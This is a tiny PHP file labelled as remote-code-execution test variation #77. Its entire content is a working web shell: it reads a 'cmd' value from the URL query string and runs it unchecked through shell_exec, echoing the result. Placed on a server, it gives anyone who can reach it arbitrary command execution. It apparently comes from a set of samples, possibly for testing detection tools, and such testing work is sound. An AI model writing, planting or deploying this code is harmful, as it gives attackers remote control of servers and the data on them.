<?php
// RCE test variation #77
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>